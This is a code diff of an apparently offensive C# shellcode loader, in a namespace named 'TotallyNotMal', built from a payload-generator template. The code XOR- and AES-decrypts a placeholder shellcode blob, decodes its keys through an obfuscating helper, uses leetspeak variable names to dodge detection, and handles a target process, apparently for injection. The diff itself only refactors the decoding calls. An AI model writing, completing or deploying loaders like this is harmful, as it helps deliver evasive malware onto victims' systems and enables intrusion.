@@ -149,17 +149,20 @@ namespace TotallyNotMal
 
         private static byte[] xorEncDec(byte[] input, string theKeystring)
         {
+
             byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
             byte[] mixed = new byte[input.Length];
+
             for (int i = 0; i < input.Length; i++)
             {
-                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
+                int length = i % theKey.Length;
+                mixed[i] = (byte)(input[i] ^ theKey[length]);
             }
             return mixed;
         }
 
-        //https://raw.githubusercontent.com/smokeme/payloadGenerator/main/xor/template
-        public static string DecryptStringFromBytes(byte[] cipherText, byte[] rawKey, byte[] rawIV)
+            //https://raw.githubusercontent.com/smokeme/payloadGenerator/main/xor/template
+            public static string DecryptStringFromBytes(byte[] cipherText, byte[] rawKey, byte[] rawIV)
         {
 
             // Declare the string used to hold
@@ -246,17 +249,12 @@ namespace TotallyNotMal
         public static void Main()
         {
 
-            string xoredAesB64 = "REPLACE SHELLCODE HERE";
-            string xorKey = "REPLACE XORKEY";
-            string aE5k3y = "REPLACE A3S_KEY";
-            string aE5Iv = "REPLACE A3S_IV";
+            string xoredAesB64 = rahsia("REPLACE SHELLCODE HERE");
+            string xorKey = rahsia("REPLACE XORKEY");
+            string aE5k3y = rahsia("REPLACE A3S_KEY");
+            string aE5Iv = rahsia("REPLACE A3S_IV");
 
             byte[] sh3Llc0d3 = new byte[] { };
-
-            xoredAesB64 = rahsia(xoredAesB64);
-            aE5k3y = rahsia(aE5k3y);
-            aE5Iv = rahsia(aE5Iv);
-            xorKey = rahsia(xorKey);
 
             byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);
 
@@ -295,6 +293,7 @@ namespace TotallyNotMal
 
             }
             bool hOpenProcessClose = CloseHandle(pHandle);
+
         }
     }
 
